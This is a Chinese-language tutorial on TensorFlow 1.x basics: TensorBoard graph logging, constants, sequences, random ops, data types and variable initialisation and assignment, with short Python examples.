<p><img src="https://www.tensorflow.org/versions/master/images/mnist_tensorboard.png" alt=""></p>
<p>当用户运行开启 TensorBoard 的 TensorFlow 程序，所有操作会输出到一个事件文件。TensorBoard 能将这些文件转为图，使模型更直观。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
</code></pre>
<p>开启 TensorBoard 只需要在运行程序的代码前添加 </p>
<p><code>writer = tf.summary.FileWriter(logs_dir,sess.graph)</code></p>
<p>其中 logs_dir 是事件文件的存放位置，比如’./graphs’。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./graphs'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># close the writer when you’re done using it</span>
writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>在执行完上述代码以后，使用 <code>tensorboard --logdir=&quot;./graphs&quot;</code>，之后打开浏览器访问 h  ttp://localhost:6006/ 就能看到以下页面。 建议使用 Chrome 访问。</p>
<p><img src="1.png" alt=""></p>
<p>点击导航上的 Graphs 可以看到</p>
<center><img src="2.png" alt=""></center>

<p>“Const” 和 “Const_1” 对应代码中的 a 和 b， “Add” 对应 x。这样很不直观，所以为了让 TensorBoard 显示 操作(ops) 的名字，可以准确定义每个变量。</p>
<pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"a"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"add"</span><span class="token punctuation">)</span>
</code></pre>
<p>这时候 TensorBoard 中的图就是这样：</p>
<center><img src="3.png" alt=""></center>

<p>图本身只定义了操作和操作来源，但不显示值。只有在运行session时才会去获取值。</p>
<p><code>tf.Session.run(fetches, feed_dict=None, options=None, run_metadata=None)</code></p>
<h3 id="u5E38_u91CF"><a href="#u5E38_u91CF" class="headerlink" title="常量"></a>常量</h3><p>创建标量或者张量(tensor)类型的常量。</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span>value<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> shape<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Const'</span><span class="token punctuation">,</span> verify_shape<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># constant of 1d tensor (vector)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># constant of 2x2 tensor (matrix)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">)</span>
</code></pre>
<p>创建由特定值构成的张量。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and all elements are zeros</span>
tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span>  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are zeros.</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span> optimize<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># input_tensor is [0, 1], [2, 3], [4, 5]]</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and all elements are ones</span>
tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span>  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are ones.</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span> optimize<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># input_tensor is [0, 1], [2, 3], [4, 5]]</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor filled with a scalar value.</span>
tf<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>dims<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<p>创建常数序列</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a sequence of  num evenlyspaced values are generated beginning at  start. If num > 1, the values in the sequence increase by stop - start / num - 1, so that the last one is exactly  stop.</span>
<span class="token comment" spellcheck="true"># start, stop, num must be scalars</span>
<span class="token comment" spellcheck="true"># comparable to but slightly different from numpy.linspace</span>
<span class="token comment" spellcheck="true"># numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)</span>
tf<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> num<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">13.0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"linspace"</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">10</span><span class="token punctuation">.</span>  <span class="token number">11</span><span class="token punctuation">.</span>  <span class="token number">12</span><span class="token punctuation">.</span>  <span class="token number">13</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a sequence of numbers that begins at start and extends by increments of delta up to but not including limit</span>
<span class="token comment" spellcheck="true"># slight different from range in Python</span>
tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token operator">=</span>None<span class="token punctuation">,</span> delta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'range'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 'start' is 3, 'limit' is 18, 'delta' is 3</span>

tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token punctuation">,</span> delta<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">9</span> <span class="token number">12</span> <span class="token number">15</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># 'start' is 3, 'limit' is 1, 'delta' is -0.5</span>

tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token punctuation">,</span> delta<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">.</span>   <span class="token number">2.5</span>  <span class="token number">2</span><span class="token punctuation">.</span>   <span class="token number">1.5</span><span class="token punctuation">]</span>



<span class="token comment" spellcheck="true"># 'limit' is 5</span>
tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>limit<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span><span class="token punctuation">]</span>
</code></pre>
<p>值得注意的是，不像NumPy，TensorFlow的序列是不可迭代的</p>
<p>tf也提供了生成确定分布的随机常量的函数。</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>random_normal<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> mean<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> mean<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_uniform<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> minval<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> maxval<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_shuffle<span class="token punctuation">(</span>value<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_crop<span class="token punctuation">(</span>value<span class="token punctuation">,</span> size<span class="token punctuation">,</span>seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>multinomial<span class="token punctuation">(</span>logits<span class="token punctuation">,</span> num_samples<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_gamma<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> beta<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<h3 id="u6570_u5B66_u8FD0_u7B97"><a href="#u6570_u5B66_u8FD0_u7B97" class="headerlink" title="数学运算"></a>数学运算</h3><p>TensorFlow 的数学运算和 NumPy 非常类似。直接看 <a href="https://www.tensorflow.org/api_docs/python/math_ops/" target="_blank" rel="external">Math API</a> 吧。</p>
<h3 id="u6570_u636E_u7C7B_u578B"><a href="#u6570_u636E_u7C7B_u578B" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="Python__u539F_u751F_u7C7B_u578B"><a href="#Python__u539F_u751F_u7C7B_u578B" class="headerlink" title="Python 原生类型"></a>Python 原生类型</h4><p>看下面的例子就能懂了。</p>
<pre class=" language-python"><code class="language-python">t_0 <span class="token operator">=</span> <span class="token number">19</span>  <span class="token comment" spellcheck="true"># Treated as a 0-d tensor, or "scalar" </span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_0<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 0</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_0<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 1</span>

t_1 <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">"apple"</span><span class="token punctuation">,</span> b<span class="token string">"peach"</span><span class="token punctuation">,</span> b<span class="token string">"grape"</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># treated as a 1-d tensor, or "vector" </span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> ['' '' '']</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> TypeError: Expected string, got 1 of type 'int' instead.</span>

t_2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># treated as a 2-d tensor, or "matrix"</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 2x2 tensor, all elements are False</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 2x2 tensor, all elements are True</span>
</code></pre>
<h4 id="TensorFlow__u539F_u751F_u7C7B_u578B"><a href="#TensorFlow__u539F_u751F_u7C7B_u578B" class="headerlink" title="TensorFlow 原生类型"></a>TensorFlow 原生类型</h4><p>TensorFlow 有自己的数据类型，比如tf.int32, tf.float32。更多详情<a href="https://www.tensorflow.org/versions/r0.11/resources/dims_types#data_types" target="_blank" rel="external">Data types</a></p>
<h4 id="NumPy__u6570_u636E_u7C7B_u578B"><a href="#NumPy__u6570_u636E_u7C7B_u578B" class="headerlink" title="NumPy 数据类型"></a>NumPy 数据类型</h4><p>TensorFlow 被设计成与 Numpy 兼容，所以 TensorFlow 的数据类型是基于 NumPy 的，甚至 np.int32 == tf.int32 返回 True。所以可以</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1.0</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1.0</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<p>长话短说，TensorFlow 类型和 NumPy 类型可以互相转换，但 TensorFlow 优点更多。</p>
<h3 id="u53D8_u91CF"><a href="#u53D8_u91CF" class="headerlink" title="变量"></a>变量</h3><p>变量被赋值以后还是可以改变，与值储存在 图 中的常量不同，变量是分开的，可能存在参数服务器上。</p>
<p>关于 图 的定义和 图 所包含的内容可以靠打印 图 的 protobuf(Protocol Buffers，是Google公司开发的一种数据描述语言)。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf

my_const <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"my_const"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> tf<span class="token punctuation">.</span>get_default_graph<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>as_graph_def<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>输出就 protobuf。</p>
<h4 id="u58F0_u660E_u53D8_u91CF"><a href="#u58F0_u660E_u53D8_u91CF" class="headerlink" title="声明变量"></a>声明变量</h4><p>声明变量需要通过实例化 tf.Variable。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create variable a with scalar value</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"scalar"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable b as a vector</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable c as a 2x2 matrix</span>
c <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"matrix"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create variable W as 784 x 10 tensor, filled with zeros</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>tf.Variable 支持以下几个操作:</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
x<span class="token punctuation">.</span>initializer <span class="token comment" spellcheck="true"># init </span>
x<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read op </span>
x<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write op </span>
x<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># and more</span>
</code></pre>
<p><strong>在使用变量之前必须初始化</strong>。使用 tf.global_variables_initializer() 可以非常简单的初始化所有变量。</p>
<pre class=" language-python"><code class="language-python">init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
</code></pre>
<p>也可以使用 tf.Variable.initializer 初始化每个变量。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create variable W as 784 x 10 tensor, filled with zeros</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">784</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    tf<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
</code></pre>
<h4 id="u6C42_u53D8_u91CF_u7684_u503C"><a href="#u6C42_u53D8_u91CF_u7684_u503C" class="headerlink" title="求变量的值"></a>求变量的值</h4><p>如果仅打印初始化的变量，得到的是 tensor 对象。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 variable object</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W
</code></pre>
<p>为了得到变量的值，需要用求值函数eval()。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 variable object</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="u8D4B_u503C"><a href="#u8D4B_u503C" class="headerlink" title="赋值"></a>赋值</h4><p>使用 tf.Variable.assign() 来给变量分配值。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
W<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
